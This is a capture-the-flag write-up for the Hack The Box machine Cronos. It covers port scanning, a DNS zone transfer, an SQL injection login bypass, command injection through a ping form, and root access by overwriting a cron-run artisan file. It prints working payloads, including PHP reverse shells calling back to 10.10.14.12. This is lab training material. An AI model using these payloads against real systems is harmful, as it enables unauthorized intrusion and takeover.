<h1>1. Recon</h1>
<h2>Nmap</h2>
<p>I started pinging the target to check if it was a Linux or a Windows system. The Time-To-Live (ttl) was 63, which is very close to 64, so it was a Linux system. Had it been close to 128 (or 128) it would have been a Windows system. After that I conducted an Nmap scan to detect active services on the target using <code>-p-</code> to scan all ports. Given that it was a Hack The Box machine (a controlled environment), I optimized the scan for speed using the following flags: <code>--min-rate 5000</code>, <code>-sS</code> for a SYN scan, <code>-Pn</code> to skip the host discovery stage, <code>-n</code> to skip reverse DNS resolution and <code>-T5</code> for higher speed.</p>
<p><img alt="image.png" src="image.png" /></p>
<p><img alt="image.png" src="image%201.png" /></p>
<p>The scan revealed the following open ports:</p>
<ul>
<li><strong>SSH</strong> on port 22.</li>
<li><strong>DNS</strong> on port 53.</li>
<li><strong>HTTP</strong> on port 80.</li>
</ul>
<p>Next, I performed a more detailed scan on those ports with service version detection (<code>-sV</code>) and used the Nmap Scripting Engine (NSE) with default scripts (<code>-sC</code>). I saved the output for reference using the <code>-oN</code> flag.</p>
<p><img alt="image.png" src="image%202.png" /></p>
<h2>Website - TCP 80</h2>
<p>Then I ran <code>gobuster</code> to brute force hidden directories but I couldn´t find any files or directories. Navigating to the site I found the default apache2 page.</p>
<p><img alt="image.png" src="image%203.png" /></p>
<p><img alt="image.png" src="image%204.png" /></p>
<p>Since the scan revealed a DNS service running on the target, I used <code>nslookup</code> to verify that the target, <code>10.10.10.13</code>, was indeed the default DNS server on the network. Additionally, I queried the server to identify the domain it was associated with. The response confirmed that the target was resolving to <code>ns1.cronos.htb</code>, indicating that the target was handling DNS requests for the <code>cronos.htb</code> domain.</p>
<p><img alt="image.png" src="image%205.png" /></p>
<p>After identifying the DNS server, I used <code>dig</code> to attempt a zone transfer (<code>AXFR</code>) on the <code>cronos.htb</code> domain, with the target as the DNS server (<code>10.10.10.13</code>). The zone transfer was successful and revealed some subdomains. I added those subdomains to the <code>/etc/hosts</code> file and then navigated to each of them.</p>
<p><img alt="image.png" src="image%206.png" /></p>
<p><img alt="image.png" src="image%207.png" /></p>
<p>As <code>cronos.htb</code> didn´t contain anything which seemed to be useful at first, I kept going.</p>
<p><img alt="image.png" src="image%208.png" /></p>
<h1>2. Gaining Access</h1>
<p>Navigating to admin.cronos.htb revealed a login panel. I intercepted the login POST request using <code>BurpSuite</code> and sent it to Repeater to test for potential SQL injection vulnerabilities. After trying various payloads, I successfully bypassed the authentication using the payload <code>' OR '1'='1'-- -</code>. This SQL injection tricked the application into granting access by always evaluating the condition as true.</p>

<p><img alt="image.png" src="image%2010.png" /></p>
<p><img alt="image.png" src="image%2011.png" /></p>
<p>After gaining access to the login panel, I discovered a tool that allowed me to execute ping and traceroute commands against any IP address I entered. Upon pressing the execute button, the output displayed was identical to the Linux command line output for the <code>ping</code> command. This behavior suggested the possibility of a Remote Code Execution vulnerability. To test this, I tried appending <code>|whoami</code> to the input, which successfully executed the command and returned the current user name.</p>
<p><img alt="image.png" src="image%2012.png" /></p>
<p><img alt="image.png" src="image%2013.png" /></p>
<p>Using the payload <code>| php -r '$sock=fsockopen("10.10.14.12",5555);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code>, I established a reverse shell connection to my command line. This allowed me to execute commands on the target machine and retrieve the user flag.</p>

<h1>3. Privilege Escalation</h1>
<h2>Root</h2>
<p>I tried checking if I had any sudo permissions but I needed the password to do so. So I decided to start a HTTP server with Python and serve <code>pspy64</code> to run it on the target and find some possible services running in the background. After some time <code>/bin/sh -c php /var/www/laravel/artisan</code> was run  as root so I checked if I had write permissions on it and I did. </p>
<p>I attempted to check for any sudo permissions but found that I needed the password to do so. After that I started a HTTP server using Python to serve the <code>pspy64</code> tool, and ran it to identify processes running in the background without needing elevated privileges. After some time, I noticed that the command <code>/bin/sh -c php /var/www/laravel/artisan</code> was executed as root. I then checked for write permissions on this file and confirmed that I had the ability to modify it.</p>

<p><img alt="image.png" src="image%2018.png" /></p>
<p><img alt="image.png" src="image%2019.png" /></p>
<p>Using <code>echo -e '#!/usr/bin/env php\n&lt;?php\n$sock = fsockopen("10.10.14.12", 5555);\nexec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' &gt; artisan</code> I generated a new <code>artisan</code> file containing the PHP reverse shell code. After some time, this file was executed again as root. As a result, I gained root permissions and was able to retrieve the root flag.</p>
